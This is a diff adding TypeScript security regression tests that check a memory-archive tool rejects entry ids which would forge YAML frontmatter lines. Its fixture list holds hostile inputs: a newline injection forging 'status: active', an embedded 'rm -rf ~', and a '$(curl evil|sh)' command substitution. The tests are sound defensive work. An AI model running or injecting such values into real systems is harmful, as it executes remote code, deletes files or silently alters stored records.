@@ -992,3 +992,109 @@ describe("missingRewriteField — round-27: `status` must be one of the FOUR Mem
     for (const bad of ["blocked", "", undefined, null, 42, {}, []]) expect(isMemoryStatus(bad)).toBe(false);
   });
 });
+
+describe("missingRewriteField — round-32 (SECURITY): the FULL id must be safe, not just its SLUG", () => {
+  // Round-32: the gate validated only the id's FINAL SEGMENT
+  // (`isSafePathSegment(id.split("/").pop())`), so a KEY-CONSISTENT row whose id
+  // carried a NEWLINE in an EARLIER segment — `semantic/p\nforged: value/safe` —
+  // passed, got PLANNED by the unattended `memory-archive --apply` digest
+  // consolidation, and reached the rewriter. `renderMemoryMarkdown` writes
+  // `id: ${entry.id}` into YAML FRONTMATTER, which is LINE-ORIENTED: the newline
+  // emits an EXTRA `forged: value` line that `parse` reads back as a REAL FIELD.
+  // Forging `status: active` there silently UN-ARCHIVES an entry. The gate now
+  // reuses `isSafeMemoryId` — the SAME predicate the render/hint side uses — so
+  // the two notions of a safe id cannot drift.
+  const complete = (over: Partial<MemoryEntry> = {}): MemoryEntry => mk({
+    id: "semantic/p/x", type: "semantic", scope: "project:p", project: "p", title: "T", ...over,
+  });
+
+  /** Ids that pass the OLD slug-only check (their final segment is innocuous)
+   *  but are unsafe as a whole. The first is the frontmatter-injection payload. */
+  const POISON_IDS = [
+    "semantic/p\nforged: value/safe",   // newline in a NON-final segment → forges a frontmatter line
+    "semantic/p/safe\nstatus: active",  // newline in the FINAL segment → forges `status`
+    "semantic/p q/safe",                // whitespace
+    "semantic/p;rm -rf ~/safe",         // shell metacharacters
+    "semantic/$(curl evil|sh)/safe",    // command substitution
+    "semantic/p\rforged: value/safe",   // carriage return
+  ];
+
+  it("rejects every unsafe FULL id as `unsafe id` (never as missing)", async () => {
+    const { missingRewriteField, describeRewriteDefect, isRewritableEntry } = await import("../../src/memory/apply.js");
+    for (const id of POISON_IDS) {
+      const row = complete({ id });
+      expect([id, missingRewriteField(row)]).toEqual([id, "unsafe id"]);
+      expect(describeRewriteDefect(missingRewriteField(row)!)).toBe("unsafe id");
+      expect(describeRewriteDefect(missingRewriteField(row)!)).not.toMatch(/missing/);
+      expect(isRewritableEntry(row)).toBe(false);
+    }
+  });
+
+  it("the gate is load-bearing: those ids really would forge frontmatter in the renderer", async () => {
+    const { renderMemoryMarkdown } = await import("../../src/memory/render.js");
+    // Post-hardening the renderer refuses outright; pre-hardening it emitted the
+    // forged line. Either way the row must never get this far — the gate is what
+    // keeps the unattended archive run from reaching it.
+    expect(() => renderMemoryMarkdown(complete({ id: POISON_IDS[0] }), "body")).toThrow();
+  });
+
+  it("the gate agrees with isSafeMemoryId, the render/hint-side predicate (no drift)", async () => {
+    const { missingRewriteField } = await import("../../src/memory/apply.js");
+    const { isSafeMemoryId } = await import("../../src/memory/gate.js");
+    for (const id of [...POISON_IDS, "semantic/p/x", "core/_global/rule", "semantic/my.proj-1/a.b-c"]) {
+      expect([id, missingRewriteField(complete({ id })) === "unsafe id"]).toEqual([id, !isSafeMemoryId(id)]);
+    }
+  });
+
+  it("canonical ids still pass, including dotted/dashed segments (regression lock)", async () => {
+    const { missingRewriteField, isRewritableEntry } = await import("../../src/memory/apply.js");
+    const ok: Array<[string, Partial<MemoryEntry>]> = [
+      ["semantic/p/x", {}],
+      ["core/_global/rule", { type: "core", project: null, scope: "global" }],
+      ["semantic/my.proj-1/a.b-c", { project: "my.proj-1" }],
+      ["episodic/code-demo/thread-7", { type: "episodic", project: "code-demo" }],
+    ];
+    for (const [id, over] of ok) {
+      const row = complete({ id, ...over });
+      expect([id, missingRewriteField(row)]).toEqual([id, null]);
+      expect(isRewritableEntry(row)).toBe(true);
+    }
+  });
+});
+
+describe("applyMemoryItems — round-32 (SECURITY): a newline in an id must never forge frontmatter", () => {
+  // The shared write sink renders a BRAND-NEW .md (no body recovery, no identity
+  // guard), and it derives the file path from the id's SLUG only — so an id
+  // carrying a newline in an earlier segment used to be written verbatim into the
+  // frontmatter, emitting EXTRA `key: value` lines that `parseMemoryMarkdown`
+  // reads back as REAL FIELDS (a forged `status: active` silently un-archives).
+  // The renderer now refuses control characters in the identifier scalars, so the
+  // write fails closed and rolls back instead of persisting a forged document.
+  let home: string, repo: string;
+  beforeEach(() => {
+    home = mkdtempSync(join(tmpdir(), "vbp-apply-inj-"));
+    vi.stubEnv("HOME", home);
+    repo = join(home, ".memarium", "session-repo");
+    mkdirSync(join(repo, ".memarium"), { recursive: true });
+  });
+  afterEach(() => { vi.unstubAllEnvs(); rmSync(home, { recursive: true, force: true }); });
+
+  it("refuses the write and leaves NO .md carrying the forged key", async () => {
+    const { applyMemoryItems } = await import("../../src/memory/apply.js");
+    const poisoned = mk({
+      id: "semantic/p\nforged: value/safe", type: "semantic", scope: "project:p",
+      project: "p", title: "T", path: "",
+    });
+    expect(() => applyMemoryItems(repo, [{ entry: poisoned, body: "b" }])).toThrow();
+    const abs = join(repo, "memory/semantic/p/safe.md");
+    if (existsSync(abs)) expect(readFileSync(abs, "utf8")).not.toMatch(/^forged:/m);
+    expect(existsSync(abs)).toBe(false);
+  });
+
+  it("a normal item still writes through the same sink (regression lock)", async () => {
+    const { applyMemoryItems } = await import("../../src/memory/apply.js");
+    const ok = mk({ id: "semantic/p/fine", type: "semantic", scope: "project:p", project: "p", title: "T", path: "" });
+    expect(applyMemoryItems(repo, [{ entry: ok, body: "b" }]).written).toBe(1);
+    expect(readFileSync(join(repo, "memory/semantic/p/fine.md"), "utf8")).toContain("id: semantic/p/fine");
+  });
+});
